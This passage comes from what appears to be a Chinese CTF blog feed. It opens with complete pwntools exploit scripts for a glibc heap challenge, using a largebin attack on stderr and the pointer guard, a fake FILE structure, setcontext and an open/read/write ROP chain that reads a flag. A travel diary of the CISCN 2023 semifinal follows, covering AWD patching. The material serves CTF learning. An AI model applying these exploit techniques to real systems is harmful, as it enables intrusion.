class="number">0x420</span>,cyclic(<span class="number">0x418</span>)+p64(<span class="number">0x10</span>))</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line">gadget = libc_base + <span class="number">0x0000000000146020</span></span><br><span class="line"><span class="comment">#mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</span></span><br><span class="line">ret = libc_base + <span class="number">0x000000000002d446</span></span><br><span class="line">pop_rax = libc_base + <span class="number">0x00000000000446c0</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x000000000002daa2</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x0000000000037c0a</span></span><br><span class="line">syscall = libc_base + <span class="number">0x00000000000883b6</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#fake stderr</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x78</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_stdfile_2_lock&#x27;</span>])</span><br><span class="line">payload = payload.ljust(<span class="number">0xc8</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_cookie_jumps&#x27;</span>]+<span class="number">0x40</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x10</span>) <span class="comment">#chunk 0-&gt;rdi</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(ROL(gadget^(heap_base+<span class="number">0x1120</span>),<span class="number">0x11</span>))</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0xe8</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#rdi-&gt;rdx</span></span><br><span class="line">payload = p64(<span class="number">0</span>)<span class="comment">#rdi</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x1120</span>+<span class="number">0x10</span>)<span class="comment">#rdx-&gt;chunk 5</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#rdx-&gt;setcontext</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">&quot;./flag\x00\x00&quot;</span></span><br><span class="line">payload += p64(setcontex61)<span class="comment">#call [rdx+0x20]</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x68</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x1120</span>+<span class="number">0x10</span>+<span class="number">0x18</span>)<span class="comment">#rdi-&gt;./flag</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#rsi-&gt;0</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x88</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)<span class="comment">#rdx-&gt;0</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x430</span>+<span class="number">0x10</span>)<span class="comment">#rsp-&gt;chunk 1</span></span><br><span class="line">payload += p64(ret)<span class="comment">#rcx-&gt;ret</span></span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0xb0</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#orw chain</span></span><br><span class="line">payload = p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#open</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#read</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#write</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">17</span>*<span class="number">8</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line"><span class="comment">#trigger assert</span></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x500</span>)</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>, terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;new-window&#x27;</span>])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">cmd += <span class="string">&quot;b *$rebase(0x1289)\nb *$rebase(0x1536)\nb *$rebase(0x15a4)\n *$rebase(0x13dd)\n&quot;</span></span><br><span class="line">gdb.attach(p, cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">offset = <span class="number">0x300740</span></span><br><span class="line">tls_offset = offset</span><br><span class="line">tls_offset += x &lt;&lt; <span class="number">16</span></span><br><span class="line">tls_offset += y &lt;&lt; <span class="number">12</span></span><br><span class="line">log.success(<span class="string">&quot;try offset:\t&quot;</span> + <span class="built_in">hex</span>(tls_offset))</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;&quot;</span></span><br><span class="line">port = <span class="number">0</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#pt = remote(host, port)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pl = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size</span>):</span><br><span class="line"><span class="comment">#size(0x40f,0x500]</span></span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">1</span>)</span><br><span class="line">pl += p8(index)</span><br><span class="line">pl += p16(size)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delet</span>(<span class="params">index</span>):</span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">2</span>)</span><br><span class="line">pl += p8(index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span><span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">3</span>)</span><br><span class="line">pl += p8(index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, size, <span class="built_in">str</span></span>):</span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">4</span>)</span><br><span class="line">pl += p8(index)</span><br><span class="line">pl += p16(size)</span><br><span class="line">pl += <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendit</span>():</span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">5</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;opcode\n&quot;</span>, pl)</span><br><span class="line">pl = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ROL</span>(<span class="params">content, n</span>):</span><br><span class="line">num = <span class="built_in">bin</span>(content)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">int</span>(num[n:]+num[:n],<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x420</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x440</span>)<span class="comment">#largebins(9)-&gt;fakestderr(after attack pointerguard)</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x430</span>)<span class="comment">#(7)(8)-&gt;pointer guard</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x420</span>)</span><br><span class="line">delet(<span class="number">0</span>)</span><br><span class="line">delet(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x1f2cc0</span></span><br><span class="line">stderr_addr = libc_base + libc.sym[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">fixed_heap_fdbk = libc_base + <span class="number">0x1f30c0</span></span><br><span class="line">setcontex61 = libc_base + <span class="number">0x50bfd</span></span><br><span class="line">point_guard = libc_base + tls_offset + <span class="number">0x30</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.success(<span class="string">&quot;stderr = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(stderr_addr)))</span><br><span class="line">log.success(<span class="string">&quot;setcontex+61 = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(setcontex61)))</span><br><span class="line">log.success(<span class="string">&quot;point_guard = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(point_guard)))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x410</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">16</span>,cyclic(<span class="number">16</span>))</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;daaa&quot;</span>)</span><br><span class="line">heap_base = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x880</span></span><br><span class="line">log.success(<span class="string">&quot;heap0_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_base)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#attack stderr</span></span><br><span class="line">payload = p64(fixed_heap_fdbk)*<span class="number">2</span> + p64(heap_base+<span class="number">0x880</span>) + p64(stderr_addr-<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">32</span>,payload)</span><br><span class="line">delet(<span class="number">5</span>)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#attack point_guart</span></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x430</span>)</span><br><span class="line">payload = p64(fixed_heap_fdbk)*<span class="number">2</span> + p64(heap_base+<span class="number">0x880</span>) + p64(point_guard-<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">32</span>,payload)</span><br><span class="line">delet(<span class="number">7</span>)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#largbin fix</span></span><br><span class="line">payload = p64(heap_base+<span class="number">0x1120</span>)+p64(libc_base+<span class="number">0x1f30c0</span>)+p64(heap_base+<span class="number">0x1120</span>)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">32</span>,payload)</span><br><span class="line">payload = p64(libc_base+<span class="number">0x1f30c0</span>)+p64(heap_base+<span class="number">0x880</span>)*<span class="number">3</span></span><br><span class="line">edit(<span class="number">7</span>,<span class="number">32</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#prepare assert</span></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x430</span>)</span><br><span class="line">delet(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x410</span>)</span><br><span class="line">edit(<span class="number">6</span>,<span class="number">0x420</span>,cyclic(<span class="number">0x418</span>)+p64(<span class="number">0x10</span>))</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line">gadget = libc_base + <span class="number">0x0000000000146020</span></span><br><span class="line"><span class="comment">#mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</span></span><br><span class="line">ret = libc_base + <span class="number">0x000000000002d446</span></span><br><span class="line">pop_rax = libc_base + <span class="number">0x00000000000446c0</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x000000000002daa2</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x0000000000037c0a</span></span><br><span class="line">syscall = libc_base + <span class="number">0x00000000000883b6</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#fake stderr</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x78</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_stdfile_2_lock&#x27;</span>])</span><br><span class="line">payload = payload.ljust(<span class="number">0xc8</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_cookie_jumps&#x27;</span>]+<span class="number">0x40</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x10</span>) <span class="comment">#chunk 0-&gt;rdi</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(ROL(gadget^(heap_base+<span class="number">0x1120</span>),<span class="number">0x11</span>))</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0xe8</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#rdi-&gt;rdx</span></span><br><span class="line">payload = p64(<span class="number">0</span>)<span class="comment">#rdi</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x1120</span>+<span class="number">0x10</span>)<span class="comment">#rdx-&gt;chunk 5</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#rdx-&gt;setcontext</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">&quot;./flag\x00\x00&quot;</span></span><br><span class="line">payload += p64(setcontex61)<span class="comment">#call [rdx+0x20]</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x68</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x1120</span>+<span class="number">0x10</span>+<span class="number">0x18</span>)<span class="comment">#rdi-&gt;./flag</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#rsi-&gt;0</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x88</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)<span class="comment">#rdx-&gt;0</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x430</span>+<span class="number">0x10</span>)<span class="comment">#rsp-&gt;chunk 1</span></span><br><span class="line">payload += p64(ret)<span class="comment">#rcx-&gt;ret</span></span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0xb0</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#orw chain</span></span><br><span class="line">payload = p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#open</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#read</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#write</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">17</span>*<span class="number">8</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line"><span class="comment">#trigger assert</span></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x500</span>)</span><br><span class="line">sendit()</span><br><span class="line">            r=p.recvuntil(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">flag = r+p.recvuntil(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line">log.success(flag)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">p.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ciscn2023半决赛游记</title>
      <link href="/2023/06/12/ciscn2023%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%B8%B8%E8%AE%B0/"/>
      <url>/2023/06/12/ciscn2023%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%B8%B8%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="6-10"><a href="#6-10" class="headerlink" title="6.10"></a>6.10</h1><p>飞往云南</p><p>东航的空乘小姐姐还给我送来一个生日蛋糕，泪目，还挺好吃</p><p>云大的赛场多少有点寒酸了，大门比我寝室门大不了多少</p><p>没网线转接器，去外面买。老板说不开发票90一个，开发票110</p><p>买了两个，这时西华的队伍也来买转接器。我们眼睁睁看着老板坐地起价，不开发票110，开发票130</p><p>晚上吃了红伞伞、白伞伞、黄伞伞，心满意足地等着小人教我打pwn</p><p>回去把unlink看完，小人还没出现，大抵是鸽了</p><h1 id="6-11"><a href="#6-11" class="headerlink" title="6.11"></a>6.11</h1><p>本来想的是Beethoven负责补补补，我负责杀杀杀，结果第一波题就给了我小小的震撼</p><p>一道是堆题，另一道也是堆题</p><p>我artist还没逆完，别人CNSS已经把洞补好了，急死我了</p><hr><h2 id="artist-patch"><a href="#artist-patch" class="headerlink" title="artist_patch"></a>artist_patch</h2><p>整道题的功能大概是，选项1分配一个80h的chunk，并读取不超过80h的输入；选项2将指定chunk内容输出并free掉，free之前可以更改chunk开头的10h字节；选项3是将某个chunk开始的第任意个字节置为NULL</p><p>整个程序中没有发现溢出，但是似乎可以利用3的功能实现对chunk header的改写，然后打一个unlink</p><p><img src="/../img/ciscn2023%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%B8%B8%E8%AE%B0.assets/image-20230612194620801.png" alt="image-20230612194620801"></p><p><img src="/../img/ciscn2023%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%B8%B8%E8%AE%B0.assets/image-20230612194711287.png" alt="image-20230612194711287"></p><p>但是因为开了Full RELRO，无法进行got hijacking，俺横竖想了半天也找不到劫持控制流的办法，但是patch还是可以做到的，只需要让更改的byte不超过chunk范围就可以了</p><p><img src="/../img/ciscn2023%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%B8%B8%E8%AE%B0.assets/image-20230612195202307.png" alt="image-20230612195202307"></p><p>于是我将my_read中canary部分改写成rax与80h的比较跳转语句，成功patch</p><h2 id="over-patch"><a href="#over-patch" class="headerlink" title="over_patch"></a>over_patch</h2><p>本场唯一一道非堆题，怎么办怎么办我还是不会</p><p>逻辑很简单，有四个选项，前三个选项都是读入一个小于等于4的数，进行一通很猛的计算，然后将某个地址的内容修改</p><p><img src="/../img/ciscn2023%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%B8%B8%E8%AE%B0.assets/image-20230612195909839.png" alt="image-20230612195909839"></p><p>选项4是将程序开头输入的名称再次输出。实现方法是：程序开始时把puts的plt地址放入某个地址，然后再调用这个地址。很显然，这里可以更改这个地址的内容，轻松地system(“&#x2F;bin&#x2F;sh”)</p><p><img src="/../img/ciscn2023%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%B8%B8%E8%AE%B0.assets/image-20230612200128649.png" alt="image-20230612200128649"></p><p>所以patch也非常简单，只需要把调用地址改成直接调用函数就行了</p><p><img src="/../img/ciscn2023%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%B8%B8%E8%AE%B0.assets/image-20230612200535096.png" alt="image-20230612200535096"></p><p>没想到这个patch折磨了我几个小时</p><p>首先，我的patch流程非常的原始，因为linux本找不到合适的ida，win本搞忘装wsl，我都是在win本上用ida进行patch，再用u盘拷到linux本上验证。这样操作u盘和接口都挺累的，Beethoven和Sparkl的u盘就是这样被玩得识别不了（</p><p>然后我发现，不管我怎么改，最后运行的时候都会segment fault。我以为是我的问题，于是尝试了各种方法：直接call puts、直接call my_write、把puts的plt再覆写到原位置再call（这个操作很长，需要jump到en_frame段），甚至我还试过在每次更改后都调用一遍初始化函数、把初始化函数放进while循环这些离谱操作，结果都是悲伤的segment fault。</p><p>我怀着沉痛的心情决定用gdb跑一遍，看看问题在哪里。于是我一路走下去，走到选项四，看到一行熟悉的汇编：jmp 0x……</p><p>我超，这不是我几轮之前的版本吗！我以为是我操作失误没有拷贝上，于是重新应用了一遍patch，重新拷过来，结果依旧能看到熟悉的jmp</p><p>此前，我一直是个坚定的无神论者</p><p>我用ida又应用了一份patch，然后用ida打开，果不其然，还是有jmp</p><p>我的ida烂了！</p><p>（严格来说，U盘也是烂的，后面我发现有时改动U盘文件，拔插后竟然可以恢复如初）</p><p>我抢来Beethoven的电脑，改了两遍就好了，call my_write，没有segment fault</p><p>喜闻乐见的是，我们交上去之后，结果是这样的：</p><p><img src="/../img/ciscn2023%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%B8%B8%E8%AE%B0.assets/image-20230612203259477.png" alt="image-20230612203259477"></p><p>乐，折磨了我两个多小时的洞，改半天连关键点都没改对</p><p>我盯着代码看了半天，横竖没看到别的洞。</p><p>直到比赛结束前二十分钟，我还是不相信，怀疑是打包的问题，于是又打了一遍。准备再次提交时，我看到提交要求：patch脚本应命名为update.sh，我一直写的是over.sh</p><p>哄堂大笑了</p><p>樂</p><h2 id="over-getflag"><a href="#over-getflag" class="headerlink" title="over_getflag"></a>over_getflag</h2><p>没做出来，解法是shino教的</p><p>我一直以为那几个修改是什么高深的算法，一度唆使密码学大师Beethoven进行破解。他发现v5并没有用上，然后我们止步于此。事实上，整个算法都是障眼法，真正有用的部分只有：将<code> *((_DWORD *)&amp;qword_4060 + v3 + 12)</code>的内容减去读入的<code>my_read</code>，因为v3可以为负，可以直接修改存储puts_plt处的内容</p><p>实际上我最大的问题是把<code>qword_4060 += v4</code>这句误以为是地址会加上v4，于是认为v4会影响最后修改的地址</p><p>所谓逆向不规范，打pwn两行泪</p><hr><p>走的时候听见一个指导老师在跟队员说：你之前的作业又没有认真做吧，你看这次出原题了吧</p><h1 id="6-12"><a href="#6-12" class="headerlink" title="6.12"></a>6.12</h1><p>计划：上午逛云大</p><p>现实：11：30被电话叫醒</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>不会堆，我好菜（你以为你菜只是因为不会堆吗）</p><p>为了打patch补了一些汇编知识，对于一个只会f5的pwn手已经很难得了</p><p>学点逆向吧</p><p>CNSS好强</p><p>什么时候才能有钱换电脑啊</p><p>云南美女真多</p>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> awd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ciscn2023pwn宝宝题解</title>
      <link href="/2023/05/29/ciscn2023pwn%E5%AE%9D%E5%AE%9D%E9%A2%98%E8%A7%A3/"/>
      <url>/2023/05/29/ciscn2023pwn%E5%AE%9D%E5%AE%9D%E9%A2%98%E8%A7%A3/</url>
      
